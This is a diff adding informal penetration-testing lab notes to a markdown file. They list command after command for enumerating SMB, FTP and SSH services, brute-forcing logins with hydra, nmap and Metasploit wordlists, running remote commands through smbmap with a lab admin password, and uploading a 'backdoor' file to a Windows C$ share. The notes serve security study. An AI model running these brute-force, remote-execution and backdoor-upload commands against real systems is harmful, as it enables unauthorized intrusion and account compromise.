@@ -166,12 +166,199 @@ To delete sessions
 ```powershell
 net use * / delete
 ```
+#### Nmap scripts for smb
+checks for misconfigurations of SMB (using outdated versions/default configs etc)
+Easily missed stuff
+Note: p445 is where microsoft-ds smb is open on
+```bash
+nmap -p445 --script smb-protocols 10.4.31.2
 
+nmap -p445 --script smb-security-mode 10.4.31.2
+```
+On example:
+guest acct is accessible (let nmap log in as guest)
+```bash
+nmap -p445 --script smb-enum-sessions 10.4.31.2
+```
+log in using known creds (cmd shud be on one line to work)
+```bash
+nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
+```
+
+Enumerate shares w/o and w authentication (files etc IPC null sessions also found here ):
+```bash
+nmap -p445 --script smb-enum-shares 10.4.31.2
+
+nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
+
+#list shares plus ls the directories found
+nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
+
+```
+
+Enumerate users
+```bash
+nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
+```
+
+Other info :
+```bash
+nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
+
+nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
+
+nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
+
+nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
+```
+
+#### SMBmap
+enumerate
+```bash
+smbmap -u guest -p "" -d . -H 10.4.26.58
+smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58
+```
+RCE available
+```bash
+smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58 -x 'ipconfig'
+#read the c drive (to also check if backdoor is dled)
+smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58 -r 'C$'
+#upload backdoor file from root folder to the c drive
+smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58 --upload '/root/backdoor' 'C$\backdoor'
+#download
+smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58 --download 'C$\flag.txt'
+```
+#### Linux uses of SMB
+version scan: Samba smbd
+
+Metasploit scanner for smb
+auxiliary/scanner/smb/smb_version
+
+Some tools choose 1 get good
+```bash
+#Tool to enumerate groups, see which we can connect to (<20> means can connect with client) :
+nmblookup -A 192.223.132.3
+
+#check if there is a IPC null session
+smbclient -L 192.223.132.3 -N
+
+#Connect with emoty user name and no pass
+rpcclient -U "" -N 192.223.132.3
+
+#another tool to ind the OS, users and bunch of other stuff
+enum4linux -o 192.76.243.3
+enum4linux -u 192.76.243.3
+
+#find if it uses smb2 using metasploit (useful info for later??)
+auxiliary/scanner/smb/smb2
+```
+Connect to smb if null session exists (no authentication needed):
+```bash
+#conect without password null session
+smbclient //192.4.17.3/Public -N
+
+#if credentials found after cracking etc
+smbclient //192.4.17.3/jane -U jane
+smbclient //192.4.17.3/admin -U admin
+#then enter password found
+```
+Cracking to enter without auth:
+ metasploit
+ ```bash
+ auxiliary/scanner/smb/smb_login
+ set rhost ....
+ set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+ #user found from enumeration
+ set smbuser jane
+```
+Hydra
+```bash
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.125.25.3 smb
+```
+
+Find pipes connected in a smb user
+```msfconsole
+use auxiliary/scanner/smb/pipe_auditor
+```
+
+Find sid of user
+```bash
+enum4linux -r -u"admin" -p "password1" 192.125.26.3
+```
+
+note: flag.tar.gz
+use: "tar -xf flag.tar.gz" to unzip
 
 ## FTP
+port: 21 
+Connect
+```bash
+#default has no creds can try without anyt if not must bf
+ftp 192.213.157.3
+```
+Hydra to get creds (long ass chunk)
+```bash
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.213.157.3 ftp
+```
+Nmap to bf with a known user
+```bash
+#Save the username in a list
+echo "sysadmin" > users
+cat users
+#should show "sysadmin" in there
+nmap 192.213.157.3 --script ftp-brute --script-args userdb=/root/users -p 21
+```
+
+Easy Targets of FTP:
+for older default implementations
+FTP anon login --> "anonymous" user doesnt need password
+
+
 
 ## SSH
+port: 22
+interact with a remote shell over an encrypted channel
+First determine if its windows or linux, linux always has root@192.12.11.2
+Connect
+```bash
+ssh root@192.244.123.3
+```
+Some enums
+```bash
+nc 192.244.123.3 22
+#might spit out the version of ssh but wont connect as its not the right protocol but good for enums
 
+#shows all the algos that could have been used to create the ssh key
+#what u want is that rsa key
+nmap 192.244.123.3 -p 22 --script ssh2-enum-algos
+
+#full rsa host key, save it for later
+nmap 192.244.123.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full
+
+#check supported auth methods for the user student/admin, if none means no password
+nmap 192.244.123.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"
+nmap 192.244.123.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=admin"
+```
+
+hydra dictionary attack
+```bash
+hydra -l student -P usr/share/wordlists/rockyou.txt 192.244.123.3 ssh
+```
+nmap script attack
+```bash
+echo "administrator"> user
+nmap 192.244.123.3 -p 22 --script ssh-brute --script-args userdb=/root/user
+```
+msfconsole
+```msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set ...
+set userpass_file /user/share/wordlists/metasploit/root_userpass.txt
+set STOP_ON_SUCCESS true
+```
 ## HTTP
+
 
 ## SQL
